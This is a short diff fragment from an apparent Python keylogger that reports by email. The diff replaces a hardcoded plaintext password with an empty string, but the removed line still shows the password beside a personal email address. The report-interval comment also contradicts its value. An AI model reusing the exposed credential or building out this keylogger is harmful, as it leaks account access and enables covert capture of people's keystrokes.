@@ -7,7 +7,7 @@ from email.mime.text import MIMEText
 
 report_time = 30  # send report every 60 sec
 Email_address = 'omar.alsabahi@outlook.com'
-Password = 'F2!wna2yn5Y8)(S'
+Password = ''
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
